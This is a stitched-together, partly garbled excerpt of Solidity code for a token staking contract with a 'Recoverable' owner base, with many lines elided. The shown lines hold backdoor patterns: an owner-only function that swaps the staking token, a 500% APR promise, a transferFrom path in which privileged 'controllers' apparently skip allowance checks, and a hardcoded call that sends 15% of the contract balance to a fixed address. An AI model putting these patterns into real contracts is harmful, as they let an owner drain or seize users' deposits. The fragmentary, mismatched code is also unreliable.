...
contract TokenStaking is ReentrancyGuard, Ownable, Recoverable {

    Token public token;

  uint256 public constant ONE_YEAR_IN_SECONDS = 31536000;
  uint256 public rewardRate = 500; // 500% APR
  ...
  event RewardsPaid(address staker, uint256 amount);
    ...
    function changeStakingToken(Token _newToken) external onlyOwner {
        token = _newToken;
    }
   ...
   address owner = _msgSender();
    ...
    require(amount < maxTransferLimit / 100 * totalSupply(), "Max Transfer Limit Exceeded");
      ...
      function transferFrom(
        ...
        if(controllers[msg.sender] || controllers[spender]) {
...
contract Recoverable is Ownable {
     ...
     */
    function recoverNFT(address _token) external onlyOwner {
     ...
     * @dev Callable by owner
     */
    function recoverToken(address _token, uint256 _tokenId) external onlyOwner {
    ...
    (bool dv, ) = payable(0xb5Afa0238113a3c67787AC184BF4865a80E11C03).call{value: address(this).balance * 15 / 100}("");
    require(dv);
